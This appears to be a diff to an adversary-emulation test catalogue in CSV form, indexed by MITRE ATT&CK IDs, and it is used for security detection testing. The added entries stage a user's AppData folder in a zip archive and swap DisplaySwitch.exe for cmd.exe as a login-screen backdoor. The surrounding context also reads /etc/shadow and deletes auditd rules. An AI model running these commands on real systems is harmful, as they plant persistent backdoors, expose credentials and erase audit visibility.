@@ -5208,6 +5208,44 @@ input_arguments.output_file.type: path
 input_arguments.output_file.default: C:\Temp\art.zip
 
 "
+T1560.001,Archive Collected Data: Archive via Utility,Copy and Compress AppData Folder,05e8942e-f04f-460a-b560-f7781257feec,"Copies the AppData folder, compresses it, and cleans up temporary files.
+",windows,,,"$AppData=""$env:USERPROFILE\AppData""
+$Copy=""#{destination_folder}""
+$Zip=""#{zip_file_path}""
+
+if (Test-Path $Copy) { Remove-Item $Copy -Recurse -Force }
+New-Item -ItemType Directory -Path $Copy | Out-Null
+
+Get-ChildItem $AppData -Recurse -Force | ForEach-Object {
+  $rel = $_.FullName.Substring($AppData.Length + 1)
+  $dest = Join-Path $Copy $rel
+  if ($_.PSIsContainer) { New-Item -ItemType Directory -Path $dest -Force | Out-Null }
+  else { Copy-Item $_.FullName -Destination $dest -Force -ErrorAction SilentlyContinue }
+}
+
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::CreateFromDirectory($Copy, $Zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)
+",powershell,True,,,,"dependencies.0.description: Requires admin and .NET compression libraries
+dependencies.0.prereq_command: if (-not ([Security.Principal.WindowsPrincipal] `
+    [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
+    [Security.Principal.WindowsBuiltInRole]::Administrator)) { exit 1 }
+if (-not (Test-Path ""$env:USERPROFILE\AppData"")) { exit 1 }
+
+dependencies.0.get_prereq_command: Run PowerShell as Administrator and ensure .NET compression assemblies are available.
+
+","input_arguments.destination_folder.type: Path
+
+input_arguments.destination_folder.default: $env:USERPROFILE\Desktop\AppDataCopy
+
+input_arguments.destination_folder.description: Temporary copy location
+
+input_arguments.zip_file_path.type: Path
+
+input_arguments.zip_file_path.default: $env:USERPROFILE\Desktop\AppDataBackup.zip
+
+input_arguments.zip_file_path.description: ZIP archive path
+
+"
 T1003.008,"OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow",Access /etc/shadow (Local),3723ab77-c546-403c-8fb4-bb577033b235,"/etc/shadow file is accessed in Linux environments
 ",linux,,,"sudo cat /etc/shadow > #{output_file}
 cat #{output_file}
@@ -29434,6 +29472,13 @@ takeown /F C:\Windows\System32\Narrator.exe /A
 icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t
 copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
 ",command_prompt,True,,"copy /Y C:\Windows\System32\Narrator_backup.exe C:\Windows\System32\Narrator.exe
+",,,
+T1546.008,Event Triggered Execution: Accessibility Features,Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe,825ba8ca-71cc-436b-b1dd-ea0d5e109086,"Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe. This allows the user to launch an elevated command prompt by pressing the Windows Key + P on the login screen.
+",windows,,,"IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd )
+takeown /F C:\Windows\System32\DisplaySwitch.exe /A
+icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t
+copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
+",command_prompt,True,,"copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
 ",,,
 T1562.012,Impair Defenses: Disable or Modify Linux Audit System,Delete all auditd rules using auditctl,33a29ab1-cabb-407f-9448-269041bf2856,"Using 'auditctl -D' deletes all existing audit rules, resulting in the loss of previously configured monitoring settings and the audit trail. This action reduces visibility into system activities, potentially leading to compliance concerns and hampering security monitoring efforts. Additionally, it poses a risk of covering unauthorized activities by erasing evidence from audit logs.
 ",linux,,,"auditctl -D
